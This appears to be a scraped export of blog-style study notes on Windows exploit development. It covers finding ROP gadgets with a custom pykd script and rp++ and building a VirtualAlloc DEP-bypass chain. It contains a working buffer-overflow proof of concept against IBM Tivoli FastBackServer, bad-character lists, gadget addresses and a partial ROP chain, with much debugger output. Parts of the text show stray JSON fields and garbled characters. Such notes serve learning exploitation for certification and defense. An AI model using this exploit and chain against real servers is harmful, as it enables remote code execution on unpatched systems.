\u0026#34;ja\u0026#34;, \u0026#34;jb\u0026#34;, \u0026#34;jc\u0026#34;, \u0026#34;je\u0026#34;, \u0026#34;jr\u0026#34;, \u0026#34;jg\u0026#34;, \u0026#34;jl\u0026#34;, \u0026#34;jn\u0026#34;, \u0026#34;jo\u0026#34;, \u0026#34;jp\u0026#34;, \u0026#34;js\u0026#34;, \u0026#34;jz\u0026#34;, \u0026#34;lock\u0026#34;, \u0026#34;enter\u0026#34;, \u0026#34;wait\u0026#34;, \u0026#34;???\u0026#34;] def log(msg): \u0026#34;\u0026#34;\u0026#34; log a message to console. @param msg: message string @return: none \u0026#34;\u0026#34;\u0026#34; print(\u0026#34;[+] \u0026#34; + msg) def getmodule(modname): \u0026#34;\u0026#34;\u0026#34; return a module object. @param modname: string module name @return: pykd module object \u0026#34;\u0026#34;\u0026#34; return module(modname) def ispageexec(address): \u0026#34;\u0026#34;\u0026#34; return true if a mem page is marked as executable @param address: address in hex format 0x41414141. @return: bool \u0026#34;\u0026#34;\u0026#34; try: protect = getvaprotect(address) except: protect = 0x1 if protect in mem_access_exe.keys(): return true else: return false def findexecpages(mod): \u0026#34;\u0026#34;\u0026#34; find executable memory pages for a module. @param mod: module object returned by getmodule @return: a python list of executable memory pages \u0026#34;\u0026#34;\u0026#34; pages = [] pn = int((mod.end() - mod.begin()) / page_size) log(\u0026#34;total memory pages: %d\u0026#34; % pn) for i in range(0, pn): page = mod.begin() + i*page_size if ispageexec(page): pages.append(page) log(\u0026#34;executable memory pages: %d\u0026#34; % len(pages)) return pages def findretn(pages): \u0026#34;\u0026#34;\u0026#34; find all return instructions for the given memory pages. @param pages: list of memory pages @return: list of memory addresses \u0026#34;\u0026#34;\u0026#34; retn = [] for page in pages: ptr = page while ptr \u0026lt; (page + page_size): b = loadsignbytes(ptr, 1)[0] \u0026amp; 0xff if b not in [0xc3, 0xc2]: ptr += 1 continue else: retn.append(ptr) ptr += 1 log(\u0026#34;found %d ret instructions\u0026#34; % len(retn)) return retn def formatinstr(instr, mod): \u0026#34;\u0026#34;\u0026#34; replace address with modbase+offset. @param instr: instruction string from disasm.instruction() @param mod: module object from getmodule @return: formatted instruction string: modbase+offset instruction \u0026#34;\u0026#34;\u0026#34; address = int(instr[0:8], 0x10) offset = address - mod.begin() return \u0026#34;%s+0x%x\\t%s\u0026#34; % (mod.name(), offset, instr[9:]) def disasmgadget(addr, mod, fp) \u0026#34;\u0026#34;\u0026#34; find gadgets. start from a ret instruction and crawl back from 1 to max_gadget_size bytes. at each iteration disassemble instructions and make sure the result gadget has no invalid instruction and is still ending with a ret. @param addr: address of a ret instruction @param mod: module object from getmodule @param fp: file object to log found gadgets @return: number of gadgets found starting from a specific address \u0026#34;\u0026#34;\u0026#34; count = 0 for i in range(1, max_gadget_size): gadget = [] ptr = addr - i dasm = disasm(ptr) gadget_size = dasm.length() while gadget_size \u0026lt;= max_gadget_size: instr = dasm.instruction() if any(bad in instr for bad in bad): break gadget.append(instr) if instr.find(\u0026#34;ret\u0026#34;) != -1: break dasm.disasm() gadget_size += dasm.length() matching = [i for i in gadget if \u0026#34;ret\u0026#34; in i] if matching: count += 1 fp.write(\u0026#34;-\u0026#34;*86 + \u0026#34;\\r\\n\u0026#34;) for instr in gadget: try: fp.write(str(instr) + \u0026#34;\\r\\n\u0026#34;) except unicodeencodeerror: print(str(repr(instr))) return count if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;#\u0026#34;*63) print(\u0026#34;# findrop.py pykd gadget discovery module #\u0026#34;) print(\u0026#34;#\u0026#34;*63) count = 0 try: modname = sys.argv[1].strip() except indexerror: log(\u0026#34;syntax: findrop.py modulename [max_gadget_size]\u0026#34;) log(\u0026#34;example: findrop.py ntdll 8\u0026#34;) sys.exit() try: max_gadget_size = int(sys.argv[2]) except indexerror: pass except valueerror: log(\u0026#34;syntax: findrop.py modulename [max_gadget_size]\u0026#34;) log(\u0026#34;example: findrop.py ntdll 8\u0026#34;) log(\u0026#34;max_gadget_size needs to be an integer\u0026#34;) sys,exit() mod = getmodule(modname) if mod: pages = findexecpages(mod) retn = findretn(pages) if retn: fp = open(\u0026#34;c:/tools/pykd/findrop_output.txt\u0026#34;, \u0026#34;w\u0026#34;) fp.write(header) start = time.time() log(\u0026#34;gadget discovery started...\u0026#34;) for ret in retn: count += disasmgadget(ret, mod, fp) fp.close() end = time.time() log(\u0026#34;gadget discovery ended (%d secs).\u0026#34; % int(end-start)) log(\u0026#34;found %d gadgets in %s.\u0026#34; % (count, mod.name())) else: log(\u0026#34;ret instructions not found!\u0026#34;) the maximum number of bytes to subtract depends on the length of rop gadgets we want.\nexample of using the tool in windb, with a default of 8 bytes length. first we load it, and then we use the custom script we created to find rop gadgets:\n0:077\u0026gt; .load pykd 0:077\u0026gt; !py c:\\tools\\pykd\\findropfull.py ############################################################### # findrop.py pykd gadget discovery module # ############################################################### [+] syntax: findrop.py modulename [max_gadget_size] [+] example: findrop.py ntdll 8 0:077\u0026gt; !py c:\\tools\\pykd\\findropfull.py fastbackserver ############################################################### # findrop.py pykd gadget discovery module # ############################################################### [+] total memory pages: 2060 [+] executable memory pages: 637 [+] found 13155 ret instructions [+] gadget discovery started... \u0026#39;004bb6fb e105 loope fastbackserver!std::pair\u0026lt;std::basic_string\u0026lt;unsigned short,std::char_traits\u0026lt;unsigned short\u0026gt;,std::allocator\u0026lt;unsigned short\u0026gt; \u0026gt; const ,char\u0026gt;::~pair\u0026lt;std::basic_string\u0026lt;unsigned short,std::char_traits\u0026lt;unsigned short\u0026gt;,std::allocat\\x00쓐۽쑙ơ쓐۽쓤۽䡻厨\\uffff\\uffff쓰۽\\udc81北\\ue5b0ࡦ\\udc81北쑡ơ⻐\\u07fc츨߯씔۽䡋厨\\x00\\x00씠۽힗匋뛻k\\x00\\x00얱ơ玈ӏ㔰ӛ츨߯\u0026#39; \u0026#39;004bbf4b e110 loope fastbackserver!std::map\u0026lt;std::basic_string\u0026lt;unsigned short,std::char_traits\u0026lt;unsigned short\u0026gt;,std::allocator\u0026lt;unsigned short\u0026gt; \u0026gt;,char,std::less\u0026lt;std::basic_string\u0026lt;unsigned short,std::char_traits\u0026lt;unsigned short\u0026gt;,std::allocator\u0026lt;uns\\x00쓐۽쑙ơ쓐۽쓤۽䡻厨\\uffff\\uffff쓰۽\\udc81北\\ue5b0ࡦ\\udc81北쑡ơ⻐\\u07fc츨߯씔۽䡋厨\\x00\\x00씠۽힗匋뽋k\\x00\\x00얱ơ玈ӏ㝠ӛ츨߯⻐\\u07fc앤۽攧厧\\x01\\x00앰۽氬匎뽋\u0026#39; \u0026#39;00630c8b e100 loope fastbackserver!std::map\u0026lt;chainstatskey_t,chainstatisticsdef,std::less\u0026lt;chainstatskey_t\u0026gt;,std::allocator\u0026lt;chainstatisticsdef\u0026gt; \u0026gt;::~map\u0026lt;chainstatskey_t,chainstatisticsdef,std::less\u0026lt;chainstatskey_t\u0026gt;,std::allocator\u0026lt;chainstatisticsd\\x00쓐۽쑙ơ쓐۽쓤۽䡻厨\\uffff\\uffff쓰۽\\udc81北\\ue5b0ࡦ\\udc81\u0026#39; [+] gadget discovery ended (10 secs). [+] found 30368 gadgets in fastbackserver. the txt file with the rop gadgets can be queried (and grepped) to find for the rop gadgets we want.\nour first rop exploit let\u0026rsquo;s use the fastbackserver exploit proof of concept:\nimport socket import sys from struct import pack # psagentcommand buf = bytearray([0x41]*0xc) buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x534) # opcode buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x0) # 1st memcpy: offset buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x500) # 1st memcpy: size field buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x0) # 2nd memcpy: offset buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x100) # 2nd memcpy: size field buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x0) # 3rd memcpy: offset buf += pack(\u0026#34;\u0026lt;i\u0026#34;, 0x100) # 3rd memcpy: size field buf += bytearray([0x41]*0x8) # pscommandbuffer formatstring = b\u0026#34;file: %s from: %d to: %d chunkloc: %d fileloc: %d\u0026#34; % (b\u0026#34;a\u0026#34;*0x200,0,0,0,0) buf += formatstring # checksum buf = pack(\u0026#34;\u0026gt;i\u0026#34;, len(buf)-4) + buf def main(): server = \u0026#34;192.168.122.113\u0026#34; port = 11460 s = socket.socket(socket.af_inet, socket.sock_stream) s.connect((server, port)) s.send(buf) s.close() print(\u0026#34;[+] packet sent\u0026#34;) sys.exit(0) if __name__ == \u0026#34;__main__\u0026#34;: main() let\u0026rsquo;s find the specific offset to crash the buffer:\nmsf-pattern_offset -l 512 -q 41326a41 [*] exact match at offset 276 at 276 bytes we start overriding eip.\nif we dump the value that esp has (stack pointer) we find that it is at offset 280. this means that esp points right after the return address. it is good because we added a offset to override the eip, and, the following bytes will be pointed by esp.\nrp++ for rop gadget search this tool will increase our speed compared to the pykd tool. the rp++ tool is a series of open source c++ applications written in c+ and provide support for both 32-bit and 64-bit cpus. the various compiled executables can run on windows, linux, macos and can locate gadgets in pe files, elf files and mach-o files.\nbesides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. this provides a massive speed increase and is one of the reasons we prefer it.\nwe just use the executable targeting the application and a output file to store the results of the search (always filtering by a gadget length):\nc:\\users\\user\\desktop\\rp-win\u0026gt;rp-win-x86.exe -f fastbackserver.exe -r 5 \u0026gt; rop.txt this is an output example of the tool:\ntrying to open \u0026#39;fastbackserver.exe\u0026#39;.. loading pe information.. fileformat: pe, arch: ia32 using the nasm syntax.. wait a few seconds, rp++ is looking for gadgets.. in .text 211283 found. a total of 211283 gadgets found. 0x00547b94: aaa ; adc dword [eax], eax ; add esp, 0x08 ; mov ecx, dword [ebp-0x00000328] ; mov dword [ecx+0x00000208], 0x00000c04 ; call dword [0x0067e494] ; (1 found) 0x00569725: aaa ; add byte [eax], al ; add byte [ebx+0x0bc0e8c8], cl ; or eax, 0x5de58b00 ; ret ; (1 found) 0x005417b2: aaa ; add byte [eax], al ; call dword [0x0067e494] ; (1 found) 0x00541b78: aaa ; add byte [eax], al ; call dword [0x0067e494] ; (1 found) we can see that for example the first found gadget is 5 instructions length.\nif we for example want to find only \u0026ldquo;pop eax, ret\u0026rdquo; simple gadgets, we can do it as each gadget sequence starts with \u0026ldquo;:\u0026rdquo;. searching for \u0026ldquo;: pop eax ; ret\u0026rdquo; gives us this result:\n0x004f22f2: pop eax ; ret ; (1 found) 0x004f2436: pop eax ; ret ; (1 found) 0x0052f30c: pop eax ; ret ; (1 found) 0x0061fdc4: pop eax ; ret ; (1 found) 0x0066f936: pop eax ; ret ; (1 found) 0x0066f98c: pop eax ; ret ; (1 found) 0x0066fff0: pop eax ; ret ; (1 found) 0x006701af: pop eax ; ret ; (1 found) 0x00670628: pop eax ; ret ; (1 found) 0x006705e0: pop eax ; ret ; (1 found) 0x0067180c: pop eax ; ret ; (1 found) 0x006723f6: pop eax ; ret ; (1 found) 0x00673430: pop eax ; ret ; (1 found) 0x006734ad: pop eax ; ret ; (1 found) 0x006744ba: pop eax ; ret ; (1 found) 0x0067456e: pop eax ; ret ; (1 found) 0x00676646: pop eax ; ret ; (1 found) 0x00676b17: pop eax ; ret ; (1 found) 0x006770dd: pop eax ; ret ; (1 found) 0x0067713a: pop eax ; ret ; (1 found) 0x006779af: pop eax ; ret ; (1 found) 0x006779c4: pop eax ; ret ; (1 found) 0x00677bca: pop eax ; ret ; (1 found) 0x00677e82: pop eax ; ret ; (1 found) 0x006783e9: pop eax ; ret ; (1 found) several memory locations where the same gadget resides, good for badchars and that stuff.\nnote: when searching for badchars, if one char does not seem to be a badchar but the previous one, and when deleting the previous one, the other previous one is badchar also, and this is repeated, it is possible that the badchar is the char that does not seem to be it. i deleted 4 chars in a row thinking that they were badchars, but the actual badchar was after them. note: common badchars are 00, 09 (ht),, 0b (vt), 0a (lf), 0c (ff), 0d (cr), 0x20 (space) the badchars for this program are:\n0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20 now, we have to locate gadgets to perform what we want. the problem is that the fastbackserver module is located at this address:\n0:061\u0026gt; lm m fastbackserver browse full module list start end module name 00400000 00c0c000 fastbackserver (deferred) so bad as the gadgets from this module will always start at 00. as our payloads will be gadgets, which are memory address inside modules, we can\u0026rsquo;t use this module for the gadgets. we need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. if we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.\nnote: native windows modules often have additional protections enabled, which will require an even more advanced approach, therefore, it is recommended to always try to find modules that are native from the application.\ndoing \u0026ldquo;lm m\u0026rdquo; list us all the modules. we can go 1 by 1 and see which one is native from the application, and choose one. for example, this one:\n0:061\u0026gt; lmdvmcsftpav6 browse full module list start end module name 50500000 50577000 csftpav6 (deferred) image path: c:\\program files\\tivoli\\tsm\\fastback\\server\\csftpav6.dll image name: csftpav6.dll browse all global symbols functions data timestamp: tue jun 1 20:36:01 2010 (4c056121) checksum: 00078277 imagesize: 00077000 file version: 6.0.6030.1648 product version: 6.0.6030.1648 file flags: 0 (mask 0) file os: 4 unknown win32 file type: 2.0 dll file date: 00000000.00000000 translations: 0409.04e4 information from resource tables: companyname: catalyst development corporation productname: sockettools (win32) internalname: csftpav6 originalfilename: csftpav6.dll productversion: 6.0.6030.1648 fileversion: 6.0.6030.1648 filedescription: sockettools file transfer protocol library legalcopyright: copyright 2010 catalyst development corporation legaltrademarks: sockettools is a trademark of catalyst development corporation comments: this library may only be redistributed according to the terms of the developer license let\u0026rsquo;s use the rp++ tool to locate gadgets inside this dll:\nrp-win-x86.exe -f csftpav6.dll -r 5 \u0026gt; rop.txt we can see that the gadgets start by 0x50, not 0x00, so we \u0026ldquo;bypassed\u0026rdquo; the badchar restriction by choosing other module for our rop gadgets:\ntrying to open \u0026#39;c:\\program files\\tivoli\\tsm\\fastback\\server\\csftpav6.dll\u0026#39;.. loading pe information.. fileformat: pe, arch: ia32 using the nasm syntax.. wait a few seconds, rp++ is looking for gadgets.. in .text 28498 found. a total of 28498 gadgets found. 0x505062c0: aaa ; add byte [eax], al ; call dword [0x5054a188] ; (1 found) 0x505072fa: aaa ; add byte [eax], al ; call dword [0x5055ca10] ; (1 found) 0x5050733a: aaa ; add byte [eax], al ; call dword [0x5055ca10] ; (1 found) 0x5050735c: aaa ; add byte [eax], al ; call dword [0x5055ca14] ; (1 found) 0x5050ae9f: aaa ; add byte [eax], al ; inc eax ; pop esi ; pop edi ; retn 0x0004 ; (1 found) 0x50507169: aaa ; add byte [eax], al ; push ebx ; call dword [0x5054a098] ; (1 found) 0x505212fe: aaa ; add byte [ecx+0x3707d6c6], al ; ret ; (1 found) 0x5051ec12: aaa ; add dword [eax], eax ; add esp, 0x0c ; pop ebp ; ret ; note: we can choose and mix different modules in case one module doesn\u0026rsquo;t have the gadget we want.\nend notes note 1: in windows, the pe file can have dep disabled but you can enable dep for the binary by using windows defender exploit guard in windows defender security center. here is an example, which narly doesn\u0026rsquo;t detect dep in the fastbackserver module as it reads the pe header, but dep in the module is enforced by the os:\nnote2: in x64, opcodes differ in length, therefore the search of gadgets is dynamic and not deterministic. in other architectures with fixed opcode length (arm \u0026gt; 4 bytes length), we just search for fixed offsets.\nnote 3: a way to check the protections of each memory page:\n0:077\u0026gt; .load narly 0:077\u0026gt; !nmod 001b0000 001e3000 snclientapi /safeseh off c:\\program files\\tivoli\\tsm\\fastback\\server\\snclientapi.dll 00400000 00c0c000 fastbackserver /safeseh off c:\\program files\\tivoli\\tsm\\fastback\\server\\fastbackserver.exe // we can see that the exception is enforced when eip points to the stack and executes code. dep is enabled for this module. 0:077\u0026gt; ed esp 90909090 0:077\u0026gt; r eip = esp 0:077\u0026gt; !vprot eip baseaddress: 010ef000 allocationbase: 00ff0000 allocationprotect: 00000004 page_readwrite regionsize: 00001000 state: 00001000 mem_commit protect: 00000004 page_readwrite type: 00020000 mem_private 0:077\u0026gt; p (158c.1110): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. eax=00236000 ebx=00000000 ecx=77d9b350 edx=77d9b350 esi=77d9b350 edi=77d9b350 eip=010eff44 esp=010eff44 ebp=010eff70 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 010eff44 90 nop ","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_rop_2/","summary":"\u003ch1 id=\"virtualalloc-rop\"\u003eVirtualAlloc ROP\u003c/h1\u003e\n\u003cp\u003eLet\u0026rsquo;s see how we can use VirtualAlloc to bypass DEP.\nVirtualAlloc is a Windows API function that can reserve, commit, \u003cstrong\u003eor change\u003c/strong\u003e the state of a region of pages in the virtual address space of the calling process.\nWe are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.\nLet\u0026rsquo;s see the skeleton of VirtualAlloc:\u003c/p\u003e","tags":[],"text":"virtualalloc rop let\u0026rsquo;s see how we can use virtualalloc to bypass dep. virtualalloc is a windows api function that can reserve, commit, or change the state of a region of pages in the virtual address space of the calling process. we are going to invoke virtualalloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through rop, and then return into it. the skeleton should contain the virtualalloc address followed by the return address (which should be our shellcode) and the arguments for the function call. let\u0026rsquo;s see the skeleton of virtualalloc:\nlpvoid virtualalloc( [in, optional] lpvoid lpaddress, [in] size_t dwsize, [in] dword flallocationtype, [in] dword flprotect ); as shown in the function prototype, virtualalloc requires a parameter (dwsize) for the size of the memory region whose protection properties we are trying to change. however, virtualalloc can only change the memory protections on a per-page basis, so as long as our shellcode is less than 0x1000 bytes (which will probably always less than such size), we can use any value between 0x01 and 0x1000. the two final arguments are predefined enums. flallocationtype must be set to the mem_commit enum value (numerical value 0x00001000), while flprotect should be set to the page_execute_readwrite enum value (numerical value 0x00000040).343 this will allow the memory page to be readable, writable, and executable.\nnote: remember that in x86 arguments are passed through the stack, so we need to push them into the stack. and not store them into the register. note: we will use virtualalloc but we could use an analogue function called virtualprotect for the same purpose, which is changing the memory protections of the shellcode that is already located in the stack.\nso we will need to push in the stack the following things:\nflprotect flallocationtype dwsize lpaddress return address (the address of our shellcode in stack) kernel32!virtualalloc address note that we first insert the latest parameters in the stack, respecting the order in which the original function will access the parameters (the first parameter is the closest to ebp). also, as the virtualalloc function will perform a \u0026ldquo;ret\u0026rdquo; instruction, we want to return to our shellcode so it gets executed after. that is why we add the \u0026ldquo;return addres\u0026rdquo; (like a call instruction would do, but as we aren\u0026rsquo;t doing a call to virtualalloc and just a direct jump, we have to insert the return address manually). this way, once virtualalloc ends, the ret instruction will take that return address (where our shellcode starts) and execute it, once the execute flag has been set.\nnow, let\u0026rsquo;s see the issues that we will have to handle:\nwe do not know the virtualalloc address beforehand. this is in the kernel32 library, which has aslr enabled. we do not know the return address (where our shellcode is) and the lpaddress (where our shellcode is) argument beforehand. dwsize, flallocationtype, and flprotect contain null bytes. we can deal with these problems by sending placeholder values in the skeleton. then we will assemble rop gadgets that will dynamically fix the values we have inserted in the stack, replacing them with the correct ones.\nlet\u0026rsquo;s update the exploit to attach these values before the return address (therefore the exploit would be: these pushed values, the eip overwrite, and the rop chain to modify these values). the following image depicts what we are doing: we will insert the following values:\nva = pack(\u0026#34;\u0026lt;l\u0026#34;, (0x45454545)) # dummy virutalalloc address va += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x46464646)) # shellcode return address va += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x47474747)) # # dummy shellcode address va += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x48484848)) # dummy dwsize va += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x49494949)) # # dummy flallocationtype va += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x51515151)) # dummy flprotect now, when we print esp, we can see that the values are not inserted properly in the stack, as the value of our shellcode address and flallocationtype are 00000000:\n0:077\u0026gt; dd esp - 24 014ae2e8 41414141 41414141 45454545 46464646 014ae2f8 00000000 48484848 00000000 51515151 014ae308 42424242 43434343 43434343 43434343 however, this won’t impact us since we’re going to overwrite them again with rop, but it\u0026rsquo;s something we need to notice. always inspect if the values you inserted in the stack are being properly reflected when the code is executed.\npatching virtualalloc dummy address using rop first we need the stack address of the first dummy value in the stack, which is the virtualalloc dummy address using rop gadgets. this value is needed so we can patch it afterwards. the easiest way to obtain a stack address close to the dummy values is to use the esp value at the time of the access violation (which, if we see the image, it points to the rop chain): we cannot modify the esp register, since it must always point to the next gadget for rop to function. instead, we will copy its value to another register. a gadget like “mov eax, esp ; ret” would be ideal, but they typically do not exist as natural opcodes. we will need to search for another gadget, like the following one:\n0x50501110: push esp ; pop reg ; ret this way we push the value of esp to the top of the stack and then we save it via pop to any register. our program does not have that type of gadget, but it does have the following gadget:\n0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret that will push the esp value to the stack, with the value of the register eax (we don\u0026rsquo;t care). that way, we pop the value of eax into edi and the value of esp into esi. this way, the esi register will contain the esp address, as desired.\nlet\u0026rsquo;s search for alternative gadgets that can help us:\n0x505010a7: push esp ; push eax ; pop edi ; pop esi ; retn 0x0004 ; (1 found) in this case, the esp pointer gets modified by the retn 0x0004 so it\u0026rsquo;s not very useful\u0026hellip;\n0x505375cf: push esp ; push eax ; pop edi ; mov eax, esi ; pop esi ; ret ; (1 found) this is very good because it adds an additional mov eax, esi but the pop esi instruction overried the value in esi with the value of esp.\nnote: the \u0026ldquo;pure\u0026rdquo; rop gadgets like pop esp, ret are not very common as normal programs would not normally do that. so most of the time we will need combined gadgets.\n1. obtaining the location of the virtualalloc parameter in stack the csftpav6.dll module uses virtualalloc, which is the function we want to execute. we need the address of this function. however, the address of the virtualalloc symbol is not predictable. this is because this symbol is inside ntdll.dll, which has aslr enabled. when this module is mapped in the memory, the address is randomized and therefore the address of this symbol will be randomized.\nhowever, remember that each of the imported functions that a module need are inside the iat of the module. the entry of virtualalloc in the csftpav6.dll has a fixed offset. when this function is mapped in memory, the entry of the iat will be fulfilled dinamically with the address of virtualalloc. therefore, our approach will be to search inside the iat for the address of virtualalloc. this is the address of virtualalloc inside the iat. this means that we can use the iat entry along with a memory dereference to fetch the address of virtualalloc at runtime. we’ll do this as part of our rop chain. with a way to resolve the address of virtualalloc, we must understand how to use it. in the previous step, we placed a dummy value (0x45454545) on the stack for this api address as part of our buffer overflow, which we need to overwrite. to do this overwrite, we will need to perform three tasks with our rop gadgets. first, locate the address on the stack where the dummy dword is. second, we need to resolve the address of virtualalloc. finally, we need to write that value on top of the placeholder value.\nwe are going to need multiple gadgets for each of these tasks. first we have to see the offset of our dummy value from the esp. by inspecting esp at the moment of the rop chain, we can see that our temporal virtualalloc value is at offset -1c from esp:\n0:006\u0026gt; dd esp - 1c 0d39e300 45454545 46464646 00000000 48484848 0d39e310 00000000 51515151 42424242 43434343 0d39e320 43434343 43434343 43434343 43434343 the dummy value 0x45454545, which represents the location of the virtualalloc address, is at a negative offset of 0x1c from esp. ideally, since we have a copy of the esp value in esi, we would like to locate a gadget similar to the following:\nsub esi, 0x1c ret this way we would have a pointer to the location of the virtualalloc address in the stack. sadly, we couldn’t find this gadget or a similar one in csftpav6. we’ll need to be a bit more creative. we could put the 0x1c value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. this would allow us to subtract the two registers (esi and the register that stores 0x1c) and get the desired address.\nnote: as we are going to perform arithmetic opertion with registers, we should dump the value in esi to eax or ecx as these registers commonly use these operations. the number of gadgets that we will find will be much higher. the idea is to have a gadget put a copy of esi into eax, then pop the negative value into ecx from the stack. next, we add ecx to eax, and finally, copy eax back into esi. one gadget that would be valid is:\n0x5050118e: mov eax, esi ; pop esi ; ret ; (1 found) the thing is that this gadgets perform an additional pop esi instruction, which means that we will need to add an additional dword in the stack for this instruction. we will do it like this:\nrop = pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5050118e)) # mov eaax, esi; pop esi; retn rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x42424242)) # junk for the pop esi value note: usually, when debugging gadgets in our program, put a breakpoint at the gadget address you want to debug, or at the address of the first gadget in the chain. this way you skip the previous analysis, and go direcly to the gadget. we let the execution go to the end of the first gadget with the pt command and finish its execution with the p command.\nif we debug this gadget, we will find that eax will contain the value in esi (nice) and that esi has the dummy value (we don\u0026rsquo;t care about esi anymore as our value is now in eax, which is better for arithmetic gadgets). let\u0026rsquo;s see this gadget on debugging:\n0:077\u0026gt; p eax=00000000 ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=0185e30c edi=00000000 eip=5050118e esp=0185e310 ebp=51515151 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 csftpav6+0x118e: 5050118e 8bc6 mov eax,esi 0:077\u0026gt; p eax=0185e30c ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=0185e30c edi=00000000 eip=50501190 esp=0185e310 ebp=51515151 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 csftpav6+0x1190: 50501190 5e pop esi 0:077\u0026gt; p eax=0185e30c ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=42424242 edi=00000000 eip=50501191 esp=0185e314 ebp=51515151 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 csftpav6+0x1191: 50501191 c3 ret 0:077\u0026gt; dd eax 0185e30c 5050118e 42424242 43434343 43434343 0185e31c 43434343 43434343 43434343 43434343 0185e32c 43434343 43434343 43434343 43434343 as seen, esi contains our dummy value on top of the stack and then eax has the original esi value (pointer to our original esp location, the location of the first rop gadget). next, we have to pop the -0x1c value into ecx and add it to eax. we can use a “pop ecx” instruction to get the negative value into ecx, followed by a gadget containing an “add eax, ecx” instruction. this will allow us to add -0x1c to eax let\u0026rsquo;s search for this gadgets, will probably be pure as they are common operations:\n0x505115a3: pop ecx ; ret ; (1 found) 0x5051579a: add eax, ecx ; ret ; (1 found) now we have to insert these two gadgets and the 0x1c value after the first gadget:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xffffffe4)) # -0x1c rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret note how the -0x1c is calculated, it is done like this:\n(28) in binary (32 bits):\n00000000 00000000 00000000 00011100 inverting the bits:\n11111111 11111111 11111111 11100011 add 1 (complemento a dos):\n11111111 11111111 11111111 11100100 now, inserting these gadget at the end shows us that the eax points to our virtualalloc address in the stack, meaning that we already have a pointer to this value in eax:\n0:004\u0026gt; p eax=0245e30c ebx=06651db0 ecx=ffffffe4 edx=77042da0 esi=42424242 edi=00000000 eip=5051579a esp=0245e320 ebp=51515151 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 csftpav6!ftpuploadfilew+0x48fc: 5051579a 03c1 add eax,ecx 0:004\u0026gt; p eax=0245e2f0 ebx=06651db0 ecx=ffffffe4 edx=77042da0 esi=42424242 edi=00000000 eip=5051579c esp=0245e320 ebp=51515151 iopl=0 nv up ei pl nz ac pe cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000217 csftpav6!ftpuploadfilew+0x48fe: 5051579c c3 ret 0:004\u0026gt; dd eax l1 0245e2f0 45454545 46464646 00000000 48484848 0245e300 00000000 00000000 0245e30c 5050118e with the correct value in eax, we need to move that value back to esi so we can use it in the next stages. we can do this with a gadget containing “push eax” and “pop esi” instructions:\nrop = pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5050118e)) # mov eax,esi ; pop esi ; retn rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x42424242)) # junk rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xffffffe4)) # -0x1c rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50537d5b)) # push eax ; pop esi ; ret this way we can use eax while esi contains the calculated address. the next step is to get the virtualalloc address of the iat and load it into a register.\n2. fetching the location of the virtualalloc address in the iat via rop we previously found that the iat address for virtualalloc is 0x5054a220, but we must remember that 0x20 is a bad character for our exploit. to solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value. first, we will use a pop eax instruction to fetch the modified iat address into eax. then, we will pop -0x01 into ecx through a pop ecx instruction. lastly, we will add the value of ecx into eax, which will be like substracting 0x01 into eax to obtain our desired value. note how we are going to reused the previous gadgets as they are still useful:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051680a)) # pop eax ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xffffffff)) # -0x01 rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5054a221)) # virtualalloc address in iat of module rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret this way, eax will contain the iat address where virtualalloc is located. but we want to access such memory address to get the real location of the function. we manage to do this by referencing the register:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051f278)) # mov eax, dword [eax] ; ret 